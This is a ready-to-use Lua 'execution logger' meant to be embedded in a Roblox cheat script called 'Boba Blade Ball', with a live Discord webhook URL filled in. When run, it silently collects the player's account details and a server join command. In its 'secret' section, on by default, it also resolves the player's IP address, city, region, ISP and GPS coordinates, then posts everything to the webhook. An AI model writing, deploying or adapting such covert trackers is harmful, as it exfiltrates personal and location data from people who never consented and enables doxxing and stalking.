
--// Config
getgenv().whscript = "Boba Blade Ball"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discordapp.com/api/webhooks/1411162056169881703/-qBlE0zsSTUr8GfT1A4gYTxtbzQOeCIo1D7qXCMGbOQqvqdjhbd8srJWsqydYpRipDPx"  --Put your Webhook Url here
getgenv().ExecLogSecret =  true                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC ðŸ’»" or "Mobile ðŸ“±"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "ðŸš€ **Script Execution Detected | Exec Log**",
                ["description"] = "*A script was executed in your script. Here are the details:*",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "ðŸ” **Script Info**",
                        ["value"] = "```ðŸ’» Script Name: " ..
                            getgenv().whscript .. "\nâ° Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ðŸ‘¤ **Player Details**",
                        ["value"] = "```ðŸ§¸ Username: " ..
                            player.Name ..
                                "\nðŸ“ Display Name: " ..
                                    player.DisplayName ..
                                        "\nðŸ†” UserID: " ..
                                            userid ..
                                                "\nâ¤ï¸ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\nðŸ”— Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ðŸ“… **Account Information**",
                        ["value"] = "```ðŸ—“ï¸ Account Age: " ..
                            player.AccountAge ..
                                " days\nðŸ’Ž Premium Status: " ..
                                    premium ..
                                        "\nðŸ“… Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ðŸŽ® **Game Details**",
                        ["value"] = "```ðŸ·ï¸ Game Name: " ..
                            gameName ..
                                "\nðŸ†” Game ID: " ..
                                    gameid ..
                                        "\nðŸ”— Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\nðŸ”¢ Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ðŸ•¹ï¸ **Server Info**",
                        ["value"] = "```ðŸ‘¥ Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\nðŸ•’ Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ðŸ“¡ **Network Info**",
                        ["value"] = "```ðŸ“¶ Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ðŸ–¥ï¸ **System Info**",
                        ["value"] = "```ðŸ“º Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\nðŸ” Memory Usage: " ..
                                            memoryUsage .. " MB\nâš™ï¸ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ðŸ“ **Character Position**",
                        ["value"] = "```ðŸ“ Position: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ðŸª§ **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(ðŸ¤«) Secret`**",
                ["value"] = "||(ðŸ‘£) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(ðŸŒ†) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(ðŸªŸ) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(ðŸ™ï¸) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(ðŸ¡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(ðŸª¢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
